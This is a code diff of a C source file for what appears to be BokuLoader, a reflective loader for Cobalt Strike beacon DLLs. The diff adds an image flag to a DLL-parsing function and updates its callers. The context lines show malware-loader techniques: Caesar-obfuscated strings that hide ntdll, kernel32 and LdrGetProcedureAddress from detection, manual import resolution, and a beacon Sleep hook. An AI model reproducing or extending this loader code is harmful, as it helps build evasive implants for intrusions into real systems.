@@ -32,7 +32,7 @@ void * BokuLoader()
 
     // Get Raw beacons base address
     raw_beacon_dll.dllBase = returnRDI();
-    parseDLL(&raw_beacon_dll);
+    parseDLL(&raw_beacon_dll, TRUE);
 
     getApis(&api);
 
@@ -302,7 +302,7 @@ void doImportTable(APIS * api, Dll * virtual_beacon_dll, Dll * raw_beacon_dll){
         );
         while(nullCheck)
         {
-            parseDLL(&dll_import);
+            parseDLL(&dll_import, FALSE);
             EntryAddress = NULL;
 
             if( LookupTableEntry && ((PIMAGE_THUNK_DATA)LookupTableEntry)->u1.Ordinal & IMAGE_ORDINAL_FLAG )
@@ -540,7 +540,7 @@ void* get_virtual_Hook_address(Dll * raw_beacon_dll, Dll * virtual_beacon_dll, v
     return virtual_hook_address;
 }
 
-void parseDLL(Dll * dll){
+void parseDLL(Dll * dll, BOOL isImg){
     dll->NewExeHeader         = getNewExeHeader(dll->dllBase);
     dll->size                 = getDllSize(dll->NewExeHeader);
     dll->SizeOfHeaders        = getDllSizeOfHeaders(dll->NewExeHeader);
@@ -549,10 +549,13 @@ void parseDLL(Dll * dll){
     dll->NumberOfSections     = getNumberOfSections(dll->NewExeHeader);
     dll->Export.Directory     = getExportDirectory(dll->dllBase);
     dll->Export.DirectorySize = getExportDirectorySize(dll->dllBase);
-    dll->Export.AddressTable  = getExportAddressTable(dll->dllBase, dll->Export.Directory);
-    dll->Export.NameTable     = getExportNameTable(dll->dllBase, dll->Export.Directory);
-    dll->Export.OrdinalTable  = getExportOrdinalTable(dll->dllBase, dll->Export.Directory);
-    dll->Export.NumberOfNames = getNumberOfNames(dll->Export.Directory);
+    if (!isImg)
+    {
+        dll->Export.AddressTable  = getExportAddressTable(dll->dllBase, dll->Export.Directory);
+        dll->Export.NameTable     = getExportNameTable(dll->dllBase, dll->Export.Directory);
+        dll->Export.OrdinalTable  = getExportOrdinalTable(dll->dllBase, dll->Export.Directory);
+        dll->Export.NumberOfNames = getNumberOfNames(dll->Export.Directory);
+    }
 }
 
 void getApis(APIS * api){
@@ -562,14 +565,14 @@ void getApis(APIS * api){
     unsigned char s_ntdll[] = {0x82,0x68,0x58,0x80,0x60,0x42,0x58,0x80,0x80,0x00};
     basicCaesar_Decrypt(9, s_ntdll, 513556);
     ntdll.dllBase = getDllBase((char *)s_ntdll);
-    parseDLL(&ntdll);
+    parseDLL(&ntdll, FALSE);
 
     // Get Export Directory and Export Tables for Kernel32.dll
     // Original String:   kERneL32.dLl // String Length:     12 // Caesar Chiper Key: 1 // Chiper String:     lFSofM43/eMm
     unsigned char s_k32[] = {0x6c,0x46,0x53,0x6f,0x66,0x4d,0x34,0x33,0x2f,0x65,0x4d,0x6d,0x01};
     basicCaesar_Decrypt(13, s_k32, 1);
     k32.dllBase = getDllBase((char *)s_k32);
-    parseDLL(&k32);
+    parseDLL(&k32, FALSE);
 
     unsigned char kstr1[] = {0x36,0x59,0x4b,0x4e,0x36,0x53,0x4c,0x5c,0x4b,0x5c,0x63,0x2b,0x00};
     basicCaesar_Decrypt(12, kstr1, 234);
@@ -679,7 +682,7 @@ void * xGetProcAddress(void * symbolStr, Dll * dll) {
         unsigned char s_ntdll[] = {0x82,0x68,0x58,0x80,0x60,0x42,0x58,0x80,0x80,0x00};
         basicCaesar_Decrypt(9, s_ntdll, 513556);
         ntdll.dllBase = getDllBase((char *)s_ntdll);
-        parseDLL(&ntdll);
+        parseDLL(&ntdll, FALSE);
         char str_LdrGetProcedureAddress[] = {0x57,0x6f,0x7d,0x52,0x70,0x7f,0x5b,0x7d,0x7a,0x6e,0x70,0x6f,0x80,0x7d,0x70,0x4c,0x6f,0x6f,0x7d,0x70,0x7e,0x7e,0};
         basicCaesar_Decrypt(22,str_LdrGetProcedureAddress,11);
         api.LdrGetProcedureAddress = getSymbolAddress(str_LdrGetProcedureAddress, 23, ntdll.dllBase, ntdll.Export.AddressTable, ntdll.Export.NameTable, ntdll.Export.OrdinalTable, ntdll.Export.NumberOfNames);
@@ -758,7 +761,7 @@ void Sleep_Hook(DWORD dwMilliseconds){
     unsigned char s_ntdll[] = {0x82,0x68,0x58,0x80,0x60,0x42,0x58,0x80,0x80,0x00};
     basicCaesar_Decrypt(9, s_ntdll, 513556);
     ntdll.dllBase = getDllBase((char *)s_ntdll);
-    parseDLL(&ntdll);
+    parseDLL(&ntdll, FALSE);
 
     char s_NtDelayExecution[] = {'N','t','D','e','l','a','y','E','x','e','c','u','t','i','o','n',0};
     int  i_NtDelayExecution   = 16;
